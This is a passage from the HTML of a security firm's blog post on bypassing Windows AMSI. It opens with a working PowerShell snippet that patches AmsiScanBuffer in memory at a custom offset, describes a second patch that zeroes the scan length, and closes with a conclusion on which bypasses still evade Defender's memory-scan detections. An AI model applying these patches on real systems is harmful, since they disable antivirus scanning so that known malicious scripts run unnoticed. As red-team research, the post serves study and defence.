#b4b4b4;">[</span><span style="color: #569cd6;">Win32</span><span style="color: #b4b4b4;">]</span><span style="color: #d4d4d4;">::GetProcAddress</span><span style="color: #b4b4b4;">($</span><span style="color: #9cdcfe;">LoadLibrary</span><span style="color: #b4b4b4;">,</span><span style="color: #d4d4d4;"> </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">Amsi</span><span style="color: #e8c9bb;">"</span><span style="color: #d4d4d4;"> </span><span style="color: #b4b4b4;">+</span><span style="color: #d4d4d4;"> </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">Scan</span><span style="color: #e8c9bb;">"</span><span style="color: #d4d4d4;"> </span><span style="color: #b4b4b4;">+</span><span style="color: #d4d4d4;"> </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">Buffer</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">)</span><br><span style="color: #b4b4b4;">$</span><span style="color: #9cdcfe;">p</span><span style="color: #d4d4d4;"> </span><span style="color: #b4b4b4;">=</span><span style="color: #d4d4d4;"> </span><span style="color: #b5cea8;">0</span><br><span style="color: #b4b4b4;">[</span><span style="color: #569cd6;">Win32</span><span style="color: #b4b4b4;">]</span><span style="color: #d4d4d4;">::VirtualProtect</span><span style="color: #b4b4b4;">($</span><span style="color: #9cdcfe;">Address</span><span style="color: #b4b4b4;">,</span><span style="color: #d4d4d4;"> </span><span style="color: #b4b4b4;">[</span><span style="color: #569cd6;">uint32</span><span style="color: #b4b4b4;">]</span><span style="color: #b5cea8;">5</span><span style="color: #b4b4b4;">,</span><span style="color: #d4d4d4;"> </span><span style="color: #b5cea8;">0x40</span><span style="color: #b4b4b4;">,</span><span style="color: #d4d4d4;"> </span><span style="color: #b4b4b4;">[</span><span style="color: #569cd6;">ref</span><span style="color: #b4b4b4;">]$</span><span style="color: #9cdcfe;">p</span><span style="color: #b4b4b4;">)</span><br><span style="color: #57a64a;"># POP R14</span><br><span style="color: #57a64a;"># POP R15</span><br><span style="color: #57a64a;"># POP RDI</span><br><span style="color: #b4b4b4;">$</span><span style="color: #9cdcfe;">Patch</span><span style="color: #d4d4d4;"> </span><span style="color: #b4b4b4;">=</span><span style="color: #d4d4d4;"> </span><span style="color: #b4b4b4;">[</span><span style="color: #569cd6;">Byte</span><span style="color: #b4b4b4;">[]]</span><span style="color: #d4d4d4;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #b5cea8;">0x41</span><span style="color: #b4b4b4;">,</span><span style="color: #d4d4d4;"> </span><span style="color: #b5cea8;">0x5F</span><span style="color: #b4b4b4;">,</span><span style="color: #d4d4d4;"> </span><span style="color: #b5cea8;">0x41</span><span style="color: #b4b4b4;">,</span><span style="color: #d4d4d4;"> </span><span style="color: #b5cea8;">0x5E</span><span style="color: #b4b4b4;">,</span><span style="color: #d4d4d4;"> </span><span style="color: #b5cea8;">0x5F</span><span style="color: #b4b4b4;">,</span><span style="color: #d4d4d4;"> </span><span style="color: #b5cea8;">0xB8</span><span style="color: #b4b4b4;">,</span><span style="color: #d4d4d4;"> </span><span style="color: #b5cea8;">0x57</span><span style="color: #b4b4b4;">,</span><span style="color: #d4d4d4;"> </span><span style="color: #b5cea8;">0x00</span><span style="color: #b4b4b4;">,</span><span style="color: #d4d4d4;"> </span><span style="color: #b5cea8;">0x07</span><span style="color: #b4b4b4;">,</span><span style="color: #d4d4d4;"> </span><span style="color: #b5cea8;">0x80</span><span style="color: #b4b4b4;">,</span><span style="color: #d4d4d4;"> </span><span style="color: #b5cea8;">0xC3</span><span style="color: #b4b4b4;">)</span><br><span style="color: #b4b4b4;">$</span><span style="color: #9cdcfe;">Address</span><span style="color: #d4d4d4;"> </span><span style="color: #b4b4b4;">=</span><span style="color: #d4d4d4;"> </span><span style="color: #b4b4b4;">[</span><span style="color: #569cd6;">Int64</span><span style="color: #b4b4b4;">]$</span><span style="color: #9cdcfe;">Address</span><span style="color: #d4d4d4;"> </span><span style="color: #b4b4b4;">+</span><span style="color: #d4d4d4;"> </span><span style="color: #b5cea8;">0x14</span><br><span style="color: #b4b4b4;">$</span><span style="color: #9cdcfe;">new</span><span style="color: #d4d4d4;"> </span><span style="color: #b4b4b4;">=</span><span style="color: #d4d4d4;"> </span><span style="color: #b4b4b4;">[</span><span style="color: #569cd6;">System.Runtime.InteropServices.Marshal</span><span style="color: #b4b4b4;">]</span><br><span style="color: #b4b4b4;">$</span><span style="color: #9cdcfe;">new</span><span style="color: #d4d4d4;">::Copy</span><span style="color: #b4b4b4;">($</span><span style="color: #9cdcfe;">Patch</span><span style="color: #b4b4b4;">,</span><span style="color: #d4d4d4;"> </span><span style="color: #b5cea8;">0</span><span style="color: #b4b4b4;">,</span><span style="color: #d4d4d4;"> </span><span style="color: #b4b4b4;">$</span><span style="color: #9cdcfe;">Address</span><span style="color: #b4b4b4;">,</span><span style="color: #d4d4d4;"> </span><span style="color: #b5cea8;">11</span><span style="color: #b4b4b4;">)</span></div>
</div>
<p>The result is -&gt; we don't get flagged anymore and bypassed AMSI:</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-21318">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_Bypass-AMSI-2025/Figure-8--AMSI-bypassed-successfully-20250213162958.png" width="846" height="630" alt="AMSI bypassed successfully">
</button>
</div>
<figcaption class="caption">Figure 8: AMSI bypassed successfully</figcaption>
</figure>

</div><div class="ce_text Mittel - 60px bg-  block" id="tools">
<div class="ce_text__content">
<p>This verifies that this detection is related to the entry point and does some sort of validation only there. Still, do we have alternatives to using <code>0xC3</code> for the case that an early return is flagged? Let's check the input arguments again:</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-21320">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_Bypass-AMSI-2025/Figure-9--AmsiScanBuffer-input-arguments-20250211160922.png" width="435" height="210" alt="AmsiScanBuffer input arguments">
</button>
</div>
<figcaption class="caption">Figure 9: AmsiScanBuffer input arguments</figcaption>
</figure>

</div><div class="ce_text Mittel - 60px bg-  block" id="tools">
<div class="ce_text__content">
<p>The third input argument is the length of the buffer to scan. What if we set this to 0? This should effectively cause a size of 0 bytes to be scanned, right? So our script or assembly will not be seen at all. The AmsiScanBuffer function moves the input argument from the <code>r8</code> register and places it in the <code>edi</code> register as follows:</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-21322">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_Bypass-AMSI-2025/Figure-10--Value-of-argument-three-stored-in-edi-20250211155821.png" width="508" height="477" alt="Value of argument three stored in edi">
</button>
</div>
<figcaption class="caption">Figure 10: Value of argument three stored in edi</figcaption>
</figure>

</div><div class="ce_text Mittel - 60px bg-  block" id="tools">
<div class="ce_text__content">
<p>We can replace <code>mov edi, r8d</code> with <code>sub edi edi</code> to clear it's value like this:</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-21324">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_Bypass-AMSI-2025/Figure-11--Patch-alternative-number-two-20250213164536.png" width="813" height="183" alt="Patch alternative number two">
</button>
</div>
<figcaption class="caption">Figure 11: Patch alternative number two</figcaption>
</figure>

</div><div class="ce_text Mittel - 60px bg-  block" id="tools">
<div class="ce_text__content">
<p>And again, the result is a working bypass without our process getting killed:</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-21326">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_Bypass-AMSI-2025/Figure-12--Demo-of-working-bypass-without-memory-scan-trigger-20250213164931.png" width="829" height="302" alt="Demo of working bypass without memory scan trigger">
</button>
</div>
<figcaption class="caption">Figure 12: Demo of working bypass without memory scan trigger</figcaption>
</figure>

</div><div class="ce_text Kein Abstand - 0px bg-  block" id="tools">
<div class="ce_text__content">
<p>Fun fact: You may remember that Defender used to flag the strings <code>amsiscanbuffer</code>, <code>amsi.dll</code> and the patch bytes as malicious, right? This is no longer the case, as this newly introduced detection is now the primary one to find and prevent a patched <code>AmsiScanBuffer</code> function. So these "old" signatures have now been replaced by the memory scan.</p>
<p>The two shown bypasses - and memory signatures for it's patches - are in theory easy to add after publication of this blog, so don't expect them to hold for too long. But the good news is that there are dozens of other patch alternatives. You just have to be creative in adjusting the patch offset and bytes.</p>            </div>
</div>
</div>
</div>
</div>
<div class="mod_article color-Schwarz Kein Abstand - 0px bg- block" id="sprung6">
<div class="container container__article">
<div class="row">
<div class="ce_text Kein Abstand - 0px bg-  block" id="lab">
<h2>6. Conclusion</h2>
<div class="ce_text__content">
<p>Much of the content that was relevant years ago to bypass AMSI is still relevant several years later. It's still a lot about signatures and getting around signatures by doing manual modification or obfuscation. Years old obfuscation tools are still not covered by generic signatures for some reason. But some EDR vendors did build AMSI based signatures for it, which effectively makes the tool without modifications useless. Modification or obfuscation in general however is still enough to completely evade AMSI detection, but with many different vendors and therefore different signature databases, it's hard to be sure that they're all bypassed.</p>
<p>Alternatively, manipulation of DLLs involved in the AMSI process at runtime leads to a generic bypass, so that <strong>known malicious</strong> scripts or assemblies can be loaded. Published bypasses mainly use memory patches or vectored exception handlers with e.g. hardware breakpoints to manipulate the scan or initialisation process at runtime. Some others rely on manipulating the DLL load process - either when AMSI hasn't been initialised yet or for newly spawned processes.</p>
<p>What's effective in 2025? From my perspective, effectiveness can be measured in terms of behaviour-based detections, as all bypasses can be easily modified to avoid signature-based detections. In my experience, using patches on the entry point of <code>amsi.dll</code> functions is no longer considered secure, as several vendors have been detecting these patches for a few years now via memory scans triggered by kernel events. Using hardware breakpoints can be considered more OpSec safe at the time of writing, but vendors are starting to use behaviour-based detections for this as well, and the cat and mouse game continues. Manipulating the DLL load process or the AMSI initialisation before it is loaded is not yet detected by behaviour, but can only be used <em>before initialisation</em> or for <em>newly spawned processes</em>.</p>
<p>Although patching at the entry point is no longer considered safe due to memory scan detections, patching at custom offsets is still appropriate for <code>amsi.dll</code>. Alternatives that patch <code>clr.dll</code> or other DLLs involved in the AMSI process usually don't trigger a memory scan based detection either. So is patching dead? I would say that it is far from dead.</p>            </div>
</div>
</div>
</div>
</div>
</div>
</main>
</div>

</div>






</body></html>